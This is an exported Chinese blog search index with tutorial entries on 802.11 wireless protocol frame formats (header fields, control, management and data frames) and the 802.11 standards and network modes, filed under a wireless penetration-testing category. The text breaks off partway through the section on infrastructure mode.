<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>802.11 头部字段介绍</title>
    <url>/2022/04/01/802.11%20%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<h2 id="基本概念">1. 基本概念</h2>
<ul>
<li>DU (Data Unit)即数据单元，信息传输的最小数据集合</li>
<li>传递过程逐层封装(Encapsulation)</li>
<li>SDU (Service Data Unit) / PDU (Protocol Data Unit)</li>
<li>MSDU <strong>-&gt; </strong>MIC -&gt; 分帧 -&gt; 添加IV -&gt; 加密
-&gt; 添加MAC头部 -&gt; MPDU</li>
<li>MPDU/PSDU +物理头 = PPDU -&gt; RF发射</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401150335894-1172943925.png" /></p>
<h2 id="pdu和sdu补充">2. PDU和SDU补充</h2>
<p><strong>原文：</strong> http://www.elecfans.com/d/1690388.html</p>
<h3 id="sduservice-data-unit">1、SDU（service Data Unit）</h3>
<p>SDU（service Data
Unit）：服务数据单元，又叫业务数据单元，是指定层的用户服务的数据集，传送到接收方的时候同一协议层时数据没有发生变化，即业务部分，然后发给下层之后，下层将其封装在PDU中发送出去。服务数据单元是从高层协议来的信息单元传送到低层协议。第N层服务数据单元SDU，和上一层的协议数据单元（PDU）是一一对应的。根据协议数据单元的数据的不同，送到接收端的指定层。</p>
<h3 id="pduprotocol-data-unit">2、PDU（Protocol Data Unit）</h3>
<p>在电信领域，协议数据单元（PDU，Protocol Data
Unit）有以下几层意义：</p>
<ul>
<li>网络的对等实体传送的信息单元，包括了控制信息，地址信息，或者数据。</li>
<li>在协议系统里，在指定的协议层上传送的数据单元，包含了该层的协议控制信息和用户信息。</li>
<li>在OSI模型系统里，PDU和最底下四层相关</li>
</ul>
<h3 id="pdu和sdu的区别">3、PDU和SDU的区别</h3>
<h4 id="pdu的封装解封装">（1）PDU的封装/解封装</h4>
<p>在发送方，将用户递交的SDU加上协议控制信息PCI，封装成PDU；在接收方，讲接收到的PDU解封装，去掉PCI，还原成SDU送交接收方用户。</p>
<h4 id="sdu分段装配">（2）SDU分段/装配</h4>
<p>如果下层通道的带宽不能满足传递SDU的需要，就需要将一个SDU分成多段，分别封装成PDU发送出去（分段）；在接收方再将这些PDU解封装后重新装配成SDU。</p>
<h4 id="sdu拼接分离">（3）SDU拼接/分离</h4>
<p>拼接是指在发送方（n）层协议实体把多个长度较短的（n）SDU封装成一个（n）PDU来发送，在接收放再将接收到的（n）PDU解封装，将多个（n）SDU分离出来。采用拼接功能的目的是提高通道的利用率。</p>
<h4 id="pdu分割组合">（4）PDU分割/组合</h4>
<p>PDU分割是指在发送端（n）层协议实体把一个（n）PDU分割成多个（n-1）SDU，并行地从多个（n-1）通道发送出去；接收端再将收到的多个（n-1）SDU组合成一个（n）PDU。由于这是一个N层功能，所以组合操作在N层中进行，即N层先得到多个分割开的（n）PDU，然后把它们组合成一个（n）PDU。有时NSDU较长，而N协议所要求的NPDU较短。这时就要对NSDU进行分段处理，将一个SDU分成两个或多个PDU来传送。当PDU所要求的长度比SDU还大时，也可将几个SDU合并成为一个PDU。</p>
<h2 id="头部分析">3. 802.11 头部分析</h2>
<h3 id="mac头结构">1、802.11 MAC头结构</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401161915662-1172285506.png" /></p>
<p>** 备注：**Sequence Control 和 IPID的意义相似</p>
<h3 id="frame-control">2、Frame control</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401162224872-672643459.png" /></p>
<h4 id="protocol-version-2bit">（1）Protocol Version (2bit)</h4>
<p>802.11协议版本，始终为0、1、2、3</p>
<h4 id="type-2bit">（2）Type (2bit)</h4>
<p>规定帧的具体用途(3种帧类型)</p>
<ul>
<li><strong>控制帧(1)</strong></li>
<li><strong>数据帧(2)</strong></li>
<li><strong>管理帧(0)</strong></li>
</ul>
<h4 id="subtype-4bit">（3）SubType (4bit)</h4>
<p>每个类型对应多个子类型，协议规定不同类型/子类型的帧完成不同功能的操作</p>
<p>Association……：关联帧，station向AP发起，Probe……：探测帧，Reserved：保留位，尚未使用</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401162327407-1818077424.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401162358628-1139460985.png" /></p>
<h4 id="todsfromds11bit">（4）ToDS/FromDS(1/1bit)</h4>
<p>标识帧的传输方向，传向DS或者来自DS；这两个字段的值决定着MAC头中4个Address字段的不同定义，具体如下图所示（BSSID即AP地址）</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220401164842469-260124030.png" /></p>
<p><strong>0x00：</strong> 出现在<a
href="https://www.cnblogs.com/z9m8r8/articles/16026639.html">IBSS</a>环境中(可能是Management帧或者是Control帧类型)
，或者是STSL (Station to Station Link)中两个STA间通信，
这种情况下通信不通过AP；</p>
<p><strong>0x01：</strong> 表示Data帧从AP向STA传递；</p>
<p><strong>0x02：</strong> 表示Data帧从STA向AP传 递；</p>
<p><strong>0x03：</strong> 表示两个AP间通信，这是典型的WDS (Wireless
Distribution
System)环境下AP间的通信，或者表示Mesh环境下MP间的通信，只有此时才会使用到Address4字段（RA,TA两个AP的地址）。</p>
<h4 id="more-frag-1bit"><strong>（5）</strong> More frag (1bit)</h4>
<p>表示是否还有后续帧，值为1时表示有后续分段，可能是Data或Management帧类型。只有单播接收地址的帧会被分段；</p>
<h4 id="retry-1bit">（6）Retry (1bit)</h4>
<p>重传，值为1表示重传帧（初次发送是被置为0的，当发完后没收到ACK则会置1重发），可能是Data或Management帧类型，接收端进程使用此值防止帧重复（该值为1且自己已经接收过该帧，则会直接丢弃）；</p>
<h4 id="power-mgmt-1bit">（7）Power Mgmt (1bit)</h4>
<p>活动模式(0)
/省电模式(1)，STA处于省电模式时，向关联的AP发送该值为1的帧(AP从不使用此字段，恒为0)，省电模式下STA不接收数据（但会接收AP发的一些特殊帧，如有唤醒意义的帧（省电
<strong>-&gt;
</strong>活动模式）），发送给它的Data帧由AP暂时缓存，待AP将它唤醒后，它会主动取回相应缓存；</p>
<h4 id="more-data-1bit">（8）More Data (1bit)</h4>
<p>当AP缓存了至少一个MSDU时，会向省电模式的STA发送该值为1的帧，表示有数据要传输给STA，接收到此帧的STA唤醒自己并向AP发送PS-
Poll帧，取回由AP为其缓存的数据。也被用于AP有更多的广播
<strong>/</strong> 多播帧需要发送的情况；</p>
<h4 id="protected-frame-1bit">（9）Protected Frame (1bit)</h4>
<p>可能是Data或Management帧类型，表示MSDU是否被加密，也被用于表示PSK身份验证Frame#3帧，数据载荷为空时，该字段值为0；</p>
<h4 id="order-1bit">（10）Order (1bit)</h4>
<p>在非QoS（质量控制）帧的情况下，值为表示数据必须按严格顺序处理（如按顺序发送），通常为0；</p>
<h3 id="durationid-16bit">3、Duration/ID (16bit)</h3>
<p>所有Control帧都使用该字段，其作用随Type/SubType变化有所不同；</p>
<p>帧类型为PS Poll (type:1, subtype:10)时，表示STA关联的AID (association
identity)
，即当station在省电模式收到AP的唤醒帧后，会向AP发送该字段填充为AID的PS-Poll帧，在AP收到PS-
Poll帧后，根据AID发送为其缓存的数据；</p>
<p>其他情况下该字段作为一种载波侦听机制，表示接收下一帧之前需要保持的时间间隔，用于NAV
(Network Allocation Vector)计算，单位是微秒;</p>
<h3 id="mac-layer-address">4、MAC Layer Address</h3>
<p>参见ToDS/FromDS(1/1bit)字段的介绍</p>
<p>补充：Basic service set ID
(BSSID)，它是BSS的2层唯一标识，Infrastructure模式中BSSID就是AP的MAC地址，当AP支持多BSS时，随机生成每个BSSID。</p>
<h3 id="sequence-control-16bit">5、Sequence Control (16bit)</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403163951396-1400741748.png" /></p>
<p>这个字段包含两个子字段: Sequence Number和Fragment Number;</p>
<p>Sequence Number是每个帧的编号，数值范围是0-
4095，以1为步长递增。当帧被分段时，同一帧中不同分段的Sequence
Number相同;</p>
<p>Fragment Number是被分段的帧用于标识分段位置顺序的编号，数值范围是0-
15,
以1为步长递增（即帧加上头部信息后过大，则该帧又会被分成多端传送，段的编号即为Fragment
Number）;</p>
<h3 id="frame-body-变长">6、Frame Body (变长)</h3>
<p>数据字段，未加密的最大MSDU长度为2304字节（其中包含最大256字节的.上层头信息，和可被传递的数据2048字节）。不同的加密方法会增加一定的内容长度;</p>
<p>WEP：8 bytes -&gt; 2312 bytes</p>
<p>TKIP (WPA1)：20 bytes -&gt; 2324 bytes</p>
<p>CCMP (WPA2)：16 bytes -&gt; 2320 bytes</p>
<p><strong>注：</strong> Control类型的帧没有Frame Body内容</p>
<h3 id="fcs-32bit">7、FCS (32bit)</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403164012957-2042046478.png" /></p>
<p>发送端对全部MAC包头和Frame Body内容进行CRC计算，计算结果即为FCS
(Frame Check
Sequence)值，接收端进行同样的计算，结果一致时，则接收端向发送端返回ACK，否则丢弃帧（只对单播帧有效，FCS错误的广
播/多播帧可能被接收）。</p>
<p><strong>注：</strong> wireshark抓包时已经删除了FCS值。</p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
        <tag>802.11 协议</tag>
      </tags>
  </entry>
  <entry>
    <title>802.11 控制帧</title>
    <url>/2022/04/03/802.11%20%E6%8E%A7%E5%88%B6%E5%B8%A7/</url>
    <content><![CDATA[<h2 id="control-frame">1. CONTROL FRAME</h2>
<p>控制帧是一些通知设备开始、停止传输或连接失败等情况的短消息，无数据段。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403165304205-1257576407.png" /></p>
<h2 id="ack">2. ACK</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403170627748-188178935.png" /></p>
<p>接收端正确接收数据之后向发送端返回ACK确认</p>
<ul>
<li>每个单播帧需要ACK立刻确认</li>
<li>组播和广播帧不需要ACK确认</li>
</ul>
<p>尽快响应</p>
<ul>
<li>由硬件完成，而非驱动层</li>
</ul>
<p><strong>Type/SubType：1/13</strong></p>
<p><strong>抓包</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403171958874-1421803399.png" /></p>
<p><strong>相关命令参见：</strong><a
href="https://www.cnblogs.com/z9m8r8/articles/16030630.html"
class="uri">https://www.cnblogs.com/z9m8r8/articles/16030630.html</a></p>
<h2 id="ps-poll">3. PS-POLL</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403180525862-1380471659.png" /></p>
<p>RF系统的放大器</p>
<ul>
<li>主要耗电的组件</li>
<li>发射前放大信号，接收并放大还原信号</li>
</ul>
<p>省电模式</p>
<ul>
<li>关闭信号发射器节省电源耗电(几乎完全关闭)</li>
</ul>
<p>AID- Association ID</p>
<h3 id="sta省电模式唤醒">1、STA省电模式唤醒</h3>
<p>数据发送至AP (AP缓存数据包)</p>
<p>通过Beacon发送TIM (traffic indication map)</p>
<p>其中包含AID</p>
<p>STA对比AID后唤醒网卡</p>
<p>STA发送PS-PolI帧，请求从AP缓存中取回数据</p>
<p>每个帧都需要ACK确认</p>
<p>ACK去人后AP从缓存中删除数据帧</p>
<p>传输过程中STA保持唤醒状态</p>
<p>传输结束后STA恢复省电状态</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403180448778-647780011.png" /></p>
<h3 id="ap接收ps--poli帧">2、AP接收PS- PolI帧</h3>
<p>立刻响应</p>
<p>延迟响应</p>
<p>简单响应帧</p>
<p>AID：关联ID</p>
<p>BSSID：STA正关联的AP地址</p>
<p>TA：发送此帧的STA地址</p>
<h2 id="rtscts">4. RTS/CTS</h2>
<p>RTS/CTS是CSMA/CA方法的一种补充手段</p>
<p>降低冲突产生的可能性</p>
<p><strong>正式通信之前通过请求应答机制，确信通信介质的可用性</strong></p>
<p><strong>并锁定传输介质和预约通信时间。</strong></p>
<p>只有在传输长帧时使用，传输短帧时不会使用</p>
<ul>
<li>驱动接口提供阈值的自定义</li>
<li>大于阈值的帧被视为长帧，反之则视为短帧</li>
</ul>
<p><strong>有线网络介质访问方式: CSMA/CD</strong></p>
<p><strong>无线网络介质访问方法: CSMA/CA</strong></p>
<p><strong>避免隐藏节点的冲突</strong></p>
<ul>
<li>n1,n2,n3三个节点，n1,n3不是对方的存在，相对而言为隐藏节点，当n1,n3同时要与n2通信时则会导致冲突（CSMA/CA），而采用RTS/CTS方式可避免冲突</li>
</ul>
<p><strong>机制</strong></p>
<ul>
<li>Node 1发送Request to Send包给Node2</li>
<li>如果未发生冲突，Node2返回Clear to Send给Node 1</li>
<li>Node 1传输数据</li>
<li>数据正常接收，Node2返回ACK，否则Node 1什么也不会收到</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403184948377-1804974125.png" /></p>
<h3 id="rts帧长度20字节">1、RTS（帧长度20字节）</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403185007732-962071099.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403190850257-2126129990.png" /></p>
<h3 id="cts帧长度14字节">2、CTS（帧长度14字节）</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403185021849-1448447689.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220403191707893-1127135427.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
        <tag>802.11 协议</tag>
      </tags>
  </entry>
  <entry>
    <title>802.11 管理帧和数据帧</title>
    <url>/2022/04/11/802.11%20%E7%AE%A1%E7%90%86%E5%B8%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E5%B8%A7/</url>
    <content><![CDATA[<h2 id="management-frame管理帧">1. MANAGEMENT FRAME(管理帧)</h2>
<p><strong>用于控制和协商STA和AP的关系</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410194219272-654899335.png" /></p>
<h2 id="beacon-frames">2. BEACON FRAMES</h2>
<p><strong>AP发送的广播帧，通告无线网络的存在(BSSID)</strong></p>
<p>发包频率</p>
<ul>
<li>102.4ms(可变)</li>
<li>时间单位1024 microseconds (60秒)，可自己设置</li>
</ul>
<p>SSID网络名</p>
<p><strong>隐藏AP不发SSID广播（路由可设置不广播，使用时可手动输入网络名和密码进行连接）</strong></p>
<h3 id="帧结构">1、帧结构</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410194741686-1789370470.png" /></p>
<h3 id="抓包分析字段部分">2、抓包分析字段（部分）</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410203310831-1147502381.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410205423438-847450555.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410203841589-470421031.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410204249703-1154891456.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410204602432-229340054.png" /></p>
<h2 id="probe-frames">3. PROBE FRAMES</h2>
<h3 id="probe-request-frames">1、PROBE REQUEST FRAMES</h3>
<p><strong>用于STA扫描现有AP</strong></p>
<ul>
<li>发现连接过的AP</li>
<li>发现未连连接的AP</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410210056649-844319384.png" /></p>
<p><strong>注意</strong> ，数据字段长度可变</p>
<p><strong>抓包</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220410211742688-1458580856.png" /></p>
<h3 id="probe-response-frames">2、PROBE RESPONSE FRAMES</h3>
<p>发现连接过的AP时，速率和ESSID相同的AP响应</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411090921372-550320158.png" /></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411105338160-1796278643.png" /></p>
<h2 id="authentication-frames">4. AUTHENTICATION FRAMES</h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411090946733-118600943.png" /></p>
<p><strong>Authentication Algorithm身份认证类型</strong></p>
<ul>
<li>0:开放系统身份验证</li>
<li>1:共享密钥身份验证</li>
</ul>
<p>身份认证有多个帧交换过程组成</p>
<p><strong>Authentication Seq</strong></p>
<ul>
<li>每次身份验证过程Seq唯一</li>
<li>1-65535</li>
</ul>
<p>Challenge text</p>
<ul>
<li>只有共享密钥方式才有此字段</li>
</ul>
<p><strong>Status Code：成功/失败</strong></p>
<h2 id="associationreassociation-frames">5. ASSOCIATION/REASSOCIATION
FRAMES</h2>
<p><strong>身份验证成功后，STA执行关联操作，加入无线网络</strong></p>
<p><strong>Association Request</strong></p>
<p><strong>Reassociation Request</strong></p>
<p><strong>Association Response</strong></p>
<h3 id="association-request-frames">1、ASSOCIATION REQUEST FRAMES</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091402411-336650571.png" /></p>
<h3 id="reassociation-request-frame">2、REASSOCIATION REQUEST FRAME</h3>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091526026-501606248.png" /></p>
<h3 id="association-response">3、ASSOCIATION RESPONSE</h3>
<p>AP对STA的关联请求的响应</p>
<p>状态码:关联成功/失败</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091609054-1722093294.png" /></p>
<h3
id="disassociationdeauthentication">4、DISASSOCIATION/DEAUTHENTICATION</h3>
<p>由AP发出，2个字节</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091710340-1945389500.png" /></p>
<p><strong>可能的原因（部分）：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091731886-476254154.png" /></p>
<h2 id="atim-frames">6. ATIM FRAMES</h2>
<p>只在ad-hoc网络下使用，充当AP功能的STA使用此帧通知接收者其有缓存的数据要发送</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220411091823515-33464501.png" /></p>
<p><strong>备注：</strong>
写博客时后面几个帧没抓到相应包，想了解实例包的可参见这篇文章：<a
href="https://blog.csdn.net/random_run/article/details/115223124">Wireshark抓包分析WLAN连接过程</a></p>
<h2 id="数据帧"><strong>7. 数据帧</strong></h2>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416150554294-685265653.png" /></p>
<p><strong>传输用户数据</strong></p>
<ul>
<li><strong>DATA Frame</strong></li>
</ul>
<p><strong>实例：</strong></p>
<p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416171716500-645063485.png" /></strong></p>
<p><strong>空数据帧</strong></p>
<ul>
<li><strong>Null data frame</strong></li>
<li><strong>只包含MAC头和FCS</strong></li>
<li><strong>STA用于声明自己将要进入省电模式</strong></li>
</ul>
<p><strong>实例：</strong></p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220416151801508-1301026222.png" /></p>
]]></content>
      <categories>
        <category>Kail Linux渗透测试</category>
        <category>无线渗透</category>
      </categories>
      <tags>
        <tag>wifi 渗透</tag>
        <tag>802.11 协议</tag>
      </tags>
  </entry>
  <entry>
    <title>802.11标准及无线网运行模式</title>
    <url>/2022/03/19/802.11%E6%A0%87%E5%87%86%E5%8F%8A%E6%97%A0%E7%BA%BF%E7%BD%91%E8%BF%90%E8%A1%8C%E6%A8%A1%E5%BC%8F/</url>
    <content><![CDATA[<h2 id="ieee">1. IEEE</h2>
<p>电气与电子工程师协会（Institute of Electrical and Electronics
Engineers），简称IEEE，总部位于美国纽约，是一个国际性的电子技术与信息科学工程师的协会，也是全球最大的非营利性专业技术学会。</p>
<p>IEEE致力于电气、电子、计算机工程和与科学有关的领域的开发和研究，在太空、计算机、电信、生物医学、电力及消费性电子产品等领域已制定了1300多个行业标准，现已发展成为具有较大影响力的国际学术组织。</p>
<p>IEEE下的802委员会负责lan（局域网），man（城域网）标准的制定。</p>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319151149806-2032877631.png" /></p>
<h2 id="标准">2. 802.11标准</h2>
<p>IEEE
802.11是现今无线局域网通用的标准，它是由国际电机电子工程学会(IEEE)所定义的无线网络通信的标准。</p>
<p>其中定义了媒体访问控制层(MAC层)和物理层。物理层定义了工作在2.4GHz的ISM频段上的两种扩频作调制方式和一种红外传输的方式，总数据传输速率设计为2Mbit/s。两个设备可以自行构建临时网络，也可以在基站(Base
Station, BS)或者接入点(Access
Point，AP)的协调下通信。为了在不同的通讯环境下取得良好的通讯质量，采用CSMA/CA(Carrier
Sense Multiple Access／Collision Avoidance)硬件沟通方式。</p>
<p><strong>注意：</strong> Wi-Fi标准是基于802.11 b的。</p>
<h3 id="协议族">1、802.11协议族：</h3>
<ul>
<li>802委员会下第11组负责开发无线局域网标准</li>
<li>IEEE 802.1 1 The Original WLAN Standard- 1 Mbit/s and 2
Mbit/w,2.4GHz RF andIR</li>
<li>IEEE 802.11 a 54 Mbit/s,5 GHz</li>
<li>IEEE 802.11 b 802.11 Enhancements to Support 5.5 Mbit/s and 11
Mbit/s</li>
<li>IEEE 802.11 c Bridge Operation Procedure</li>
<li>IEEE 802.11 d International (Country to Country) Roaming
Extensions</li>
<li>IEEE 802.11 e Quality of Service (Qos),Including Packet
Bursting</li>
<li>IEEE 802.11 F Inter -Access Point Protocol</li>
<li>IEEE 802.11 g 54 Mbit/s,2.4 GHz</li>
<li>IEEE 802.11 h Spectrum Managed 802.11 a (5 GHz) for European
Compatibility</li>
<li>IEEE 802.11 i Enhanced Security</li>
<li>IEEE 802.11 j Extensions for Japan</li>
<li>IEEE 802.11 k Radio Resource Measurement Enhancements</li>
<li>IEEE 802.11 n Higher Throughput Using Multiple Input,Multiple
Ouput(MIMO) Antennas</li>
<li>IEEE 802.11 p Wireless Access for the Vehicular Environment
(WAVE)</li>
<li>IEEE 802.11 r Fast BSS Transition (FT)</li>
<li>IEEE 802.11 s Mesh Networking,Extended Service Set (ESS)</li>
<li>IEEE 802.11 T Wireless Performance Prediction (WPP)</li>
<li>IEEE 802.11 u Internetworking with Non -802 Networks
(i.e.:Cellular)</li>
<li>IEEE 802.11 v wrieless Network Management</li>
<li>IEEE 802.11 v wrieless Network Management</li>
<li>IEEE 802.11 w Protected Management Frames</li>
<li>IEEE 802.11 y 3650 - 3700 MHz Operation in the US</li>
<li>IEEE 802.11 z Direct Link Setup (DLS) Extensions</li>
<li>IEEE 802.11 zm Maintenance of the Standard</li>
<li>IEEE 802.11 aa Robust Streatming of Audio Video Transport
Streams</li>
<li>IEEE 802.11 ac Very High Troughput &lt; 6 GHz</li>
<li>IEEE 802.11 ad Very High Troughput, 60 GHz</li>
<li>IEEE 802.11 ae Qos Management</li>
<li>IEEE 802.11 af TV Whitespace</li>
<li>IEEE 802.11 ah SUb 1 GHz</li>
<li>IEEE 802.11 ai Fast Initial Link Setip</li>
</ul>
<h3 id="日常使用">2、日常使用</h3>
<ul>
<li>IEEE 802.11 - The original WLAN standard</li>
<li>IEEE 802.11 a - UP to 54 Mbit/s on 5 GHz</li>
<li>IEEE 802.11 b - 5.5 Mbit/s and 11 Mbit/s? on 2.4 GHz</li>
<li>IEEE 802.11 g - Up to 54 Mbit/s on 2.4 GHz.Backward compatible with
802.11b</li>
<li>IEEE 802.11 i - Provides enhanced security</li>
<li>IEEE 802.11 n - Provides higher throughput with Multiple
Input/Multiple Output (MIMO)</li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319152831383-514252146.png" /></p>
<h3 id="section">3、802.11</h3>
<p><strong>发布于1997年</strong></p>
<p><strong>速率1Mbps或2Mbps</strong></p>
<p><strong>红外线传输介质（未实现）</strong></p>
<p><strong>无线射频信号编码（调制）（radio frequencies）</strong></p>
<ul>
<li><strong>-Direct-Sequence Spread-Spectrum
(DSSS)-----直序扩频</strong></li>
<li><strong>-Frequency Hopping Spread-Spectrum
(FHSS)-----跳频扩频</strong></li>
</ul>
<p><strong>媒体访问方式-----CSMA/CA c=b+log2 (1+s/n)
(载波侦听多路访问冲突避免)</strong></p>
<ul>
<li>根据算法侦听一定时长</li>
<li>发送数据前发包声明</li>
</ul>
<p><strong>Request to Send/Clear to Send (RTS/CTS)</strong></p>
<h3 id="b">4、802.11b</h3>
<p><strong>Complementary Code Keying (CCK)-----补充代码键</strong></p>
<ul>
<li><strong>5.5 and 11 Mbit/s</strong></li>
<li><strong>2.4GHz band (2.4GHz - 2.485GHz)</strong></li>
<li><strong>14个重叠的信道channels</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319154925085-698633778.png" /></p>
<ul>
<li><strong>每个信道22MHz宽带</strong></li>
<li><strong>只有三个完全不重叠的信道</strong></li>
</ul>
<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220319154724564-1909481604.png" /></p>
<p><strong>美国 -1 to 11 (2.412 GHz - 2.462 GHz)</strong></p>
<p><strong>欧洲 -1 to 13 (2.412 GHz - 2.472 GHz)</strong></p>
<p><strong>日本 -1 to 14 (2.412 GHz - 2.482 GHz)</strong></p>
<p><strong>注意：相邻两个无线设备的信道不要重叠，以免造成影响</strong></p>
<h3 id="a">5、802.11a</h3>
<p><strong>与802.11b几乎同时发布</strong></p>
<ul>
<li><strong>因设备价格问题一直没有得到广泛使用?</strong></li>
</ul>
<p><strong>使用5GHz宽带</strong></p>
<ul>
<li><strong>-2.4GHz宽带干扰源多（微波、蓝牙、无绳电话）</strong></li>
<li><strong>-5HGz频率有更多宽带空间，可容纳更多不重叠的信道</strong></li>
<li><strong>-Orthogonal Frequency-Division Multiplexing
(OFDM)信号调制方法</strong></li>
<li><strong>-正交频分复用技</strong></li>
<li><strong>更高速率54Mbps，每个信道20MHz宽带</strong></li>
<li><strong>变频</strong></li>
<li><strong>-5.15-5.35GHz室内</strong></li>
<li><strong>-5.7-5.8GHz室外</strong></li>
</ul>
<h3 id="g">6、802.11g</h3>
<p><strong>2.4GHz</strong></p>
<p><strong>Orthogonal Frequency-Division Multiplexing
(OFDM)信号调制方法?</strong></p>
<p><strong>与802.11a速率相同</strong></p>
<p><strong>可全局降速，向后兼容802.11b,并切换为CCK信号调制方法</strong></p>
<p><strong>每个信号20/22MHz宽带</strong></p>
<h3 id="n">7、802.11n</h3>
<p><strong>2.4或5 GHz频率</strong></p>
<ul>
<li><strong>300Mbps最高600Mbps</strong></li>
<li><strong>Multiple-Input Multiple-Output
(MIMO)多进多出通信技术</strong></li>
<li><strong>多天线，多无线电波，独立收发信号</strong></li>
<li><strong>可以使用40MHz信道带宽是数据传输速率翻倍</strong></li>
</ul>
<p><strong>全802.11n设备网络中，可以使用新报文格式，是速率达到最大</strong></p>
<p><strong>每个信道20/40MHz宽带</strong></p>
<h2 id="无线网运行模式">3. 无线网运行模式</h2>
<p><strong>无线网络架构</strong></p>
<p><strong>Infrastructure</strong></p>
<p>AP 维护SSID(无线名)</p>
<p><strong>Ad-Hoc</strong></p>
<p>STA维护SSID</p>
<p><strong>Service Set Identifier (SSID)</strong></p>
<ul>
<li><strong>AP每秒钟约 10次通过Beacon帧广播SSID</strong></li>
<li><strong>客户端连接到无线网络后也会宣告SSID</strong></li>
</ul>
<h3 id="infrastructure">1、Infrastructure</h3>
<ul>
<li><strong>至少包含一个 AP 和 一个 STATION（终端），形成一个 Basic
Service Set (BSS)，BSSID指对应 AP 的 MAC。</strong></li>
